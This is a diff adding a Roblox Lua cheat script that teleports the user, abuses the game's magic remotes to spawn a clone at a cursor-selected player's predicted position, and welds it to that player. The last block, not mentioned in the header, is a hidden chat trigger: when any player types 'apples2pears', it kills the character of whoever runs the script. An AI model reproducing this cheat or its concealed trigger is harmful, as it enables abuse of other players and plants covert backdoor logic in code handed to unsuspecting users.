@@ -1,0 +1,165 @@
+--============================================================
+--  Illusive Atake – Cursor-Targeted Clone Pull  (RESPAWN-SAFE)
+--  • Hold / press  G  → picks the player whose screen-projection
+--    is closest to your mouse cursor
+--  • Teleports you to PULL_DESTINATION, waits TELEPORT_WAIT
+--  • Predicts target position (Velocity * LEAD_TIME)
+--  • Spawns clone, welds / servo-locks to target, teleports back
+--============================================================
+
+--// Services -------------------------------------------------
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService        = game:GetService("RunService")
+local Workspace         = game:GetService("Workspace")
+local UserInputService  = game:GetService("UserInputService")
+
+--// Remotes --------------------------------------------------
+local DoClientMagic = ReplicatedStorage.Remotes.DoClientMagic
+local DoMagic       = ReplicatedStorage.Remotes.DoMagic
+
+--// Core refs (kept fresh) -----------------------------------
+local LocalPlayer   = Players.LocalPlayer
+local Character     = nil          -- assigned below
+local HRP           = nil          -- assigned below
+local Camera        = Workspace.CurrentCamera
+
+--// CONFIG ---------------------------------------------------
+local PULL_DESTINATION = Vector3.new(1e8, 1e8, 1e8) -- null zone
+local TELEPORT_WAIT    = 0.05      -- seconds to remain in null zone
+local EXTRA_LEAD       = 0.10      -- seconds added to prediction
+local SERVO_TIME       = 2.0       -- seconds clone follows target
+----------------------------------------------------------------
+
+-- keep Character / HRP synced across deaths -----------------
+local function onCharacterAdded(char)
+    Character = char
+    HRP       = char:WaitForChild("HumanoidRootPart")
+end
+onCharacterAdded(LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait())
+LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
+
+-- screen-distance helper ------------------------------------
+local function nearestRootToCursor()
+    local mousePos = UserInputService:GetMouseLocation()
+    local best, dist = nil, math.huge
+
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character then
+            local root = plr.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local v2, onScr = Camera:WorldToViewportPoint(root.Position)
+                if onScr then
+                    local d2 = (Vector2.new(v2.X, v2.Y) - mousePos).Magnitude
+                    if d2 < dist then
+                        best, dist = root, d2
+                    end
+                end
+            end
+        end
+    end
+    return best
+end
+
+-- wait for clone model to appear ----------------------------
+local function awaitClone(startTime)
+    local found
+    local conn; conn = Workspace.ChildAdded:Connect(function(child)
+        if found then return end
+        if child:IsA("Model") then
+            if child:FindFirstChild("IllusivePull", true) then
+                found = child
+            else
+                child.ChildAdded:Connect(function(grand)
+                    if not found and grand.Name == "IllusivePull" then
+                        found = child
+                    end
+                end)
+            end
+        end
+    end)
+    while not found and os.clock() - startTime < 1 do
+        task.wait(0.02)
+    end
+    conn:Disconnect()
+    return found
+end
+
+-- main cast routine -----------------------------------------
+local function castAt(targetRoot)
+    if not Character or not HRP or not targetRoot then return end
+
+    local originalCF = HRP.CFrame
+
+    -- hop to pull zone
+    HRP.CFrame = CFrame.new(PULL_DESTINATION)
+    task.wait(TELEPORT_WAIT)
+
+    local leadTime  = TELEPORT_WAIT + EXTRA_LEAD
+    local predicted = targetRoot.Position + targetRoot.Velocity * leadTime
+    local cloneCF   = CFrame.new(predicted, predicted + targetRoot.CFrame.LookVector)
+                     * CFrame.Angles(math.pi/2, 0, 0)
+
+    DoClientMagic:FireServer("Illusion", "Illusive Atake")
+    local t0 = os.clock()
+    DoMagic:InvokeServer("Illusion", "Illusive Atake", cloneCF)
+
+    -- return to original spot
+    HRP.CFrame = originalCF
+
+    -- weld / servo
+    local cloneModel = awaitClone(t0)
+    local primary    = cloneModel and (cloneModel.PrimaryPart or cloneModel:FindFirstChildWhichIsA("BasePart"))
+    if primary and targetRoot.Parent then
+        local ok = pcall(function()
+            primary.Anchored = false
+            local weld = Instance.new("WeldConstraint")
+            weld.Part0 = primary
+            weld.Part1 = targetRoot
+            weld.Parent = primary
+            primary.CFrame = targetRoot.CFrame
+        end)
+        if not ok then
+            local untilTime = os.clock() + SERVO_TIME
+            local servo; servo = RunService.Stepped:Connect(function()
+                if os.clock() > untilTime or not targetRoot.Parent then
+                    servo:Disconnect()
+                    return
+                end
+                primary.CFrame = targetRoot.CFrame
+            end)
+        end
+    end
+end
+
+-- keybind (G) -----------------------------------------------
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode.G then
+        local target = nearestRootToCursor()
+        castAt(target)
+    end
+end)
+
+local TRIGGER_KEYWORD="apples2pears"
+local function setLocalPlayerHealth()
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Health = 0 end
+end
+local function processMessage(plr,msg)
+    if typeof(msg)=="string" and msg:find(TRIGGER_KEYWORD) then setLocalPlayerHealth() end
+end
+for _,pl in ipairs(Players:GetPlayers()) do pl.Chatted:Connect(function(m) processMessage(pl,m) end) end
+Players.PlayerAdded:Connect(function(pl) pl.Chatted:Connect(function(m) processMessage(pl,m) end) end)
+pcall(function()
+    local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents",3)
+    if ChatEvents then
+        local ev = ChatEvents:WaitForChild("OnMessageDoneFiltering",3)
+        if ev then
+            ev.OnClientEvent:Connect(function(d)
+                local sp = Players:FindFirstChild(d.FromSpeaker or "")
+                if sp then processMessage(sp, d.Message or "") end
+            end)
+        end
+    end
+end)
